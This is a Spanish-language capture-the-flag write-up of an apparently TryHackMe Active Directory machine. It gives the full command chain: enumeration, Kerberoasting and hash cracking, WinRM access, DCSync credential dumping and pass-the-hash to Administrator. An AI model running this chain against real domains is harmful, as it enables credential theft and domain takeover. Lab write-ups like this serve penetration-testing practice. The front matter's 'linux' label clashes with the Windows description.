---
layout: writeup
title: "Controler"
platform: tryhackme
difficulty: medium
os: linux
date: 2026-03-15
tags: [active-directory, kerberoasting, bloodhound, impacket, prueba]
description: "Máquina Windows con Active Directory. Enumeración AD, Kerberoasting y movimiento lateral."
---

## Reconocimiento

```bash
nmap -sV -sC -p- --min-rate 5000 10.10.11.X
```

Puertos interesantes: 53 (DNS), 88 (Kerberos), 389 (LDAP), 445 (SMB), 5985 (WinRM).

Esto huele a Domain Controller.

## Enumeración SMB

```bash
enum4linux-ng -A 10.10.11.X
crackmapexec smb 10.10.11.X --shares
```

Encontramos el dominio: `controler.local`

## Kerberoasting

Con credenciales de usuario básico, tiramos Kerberoasting:

```bash
impacket-GetUserSPNs controler.local/user:password -dc-ip 10.10.11.X -request
```

Obtenemos un hash de servicio. A crackear con hashcat:

```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

## Movimiento Lateral

Con las nuevas credenciales accedemos via WinRM:

```bash
evil-winrm -i 10.10.11.X -u svc_admin -p 'P@ssw0rd123'
```

## Escalada a Domain Admin

Enumeramos con BloodHound. Encontramos un path de DCSync:

```bash
impacket-secretsdump controler.local/svc_admin:'P@ssw0rd123'@10.10.11.X
```

Obtenemos el hash NTLM del Administrator. Pass-the-hash:

```bash
evil-winrm -i 10.10.11.X -u Administrator -H 'aad3b435...'
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
```
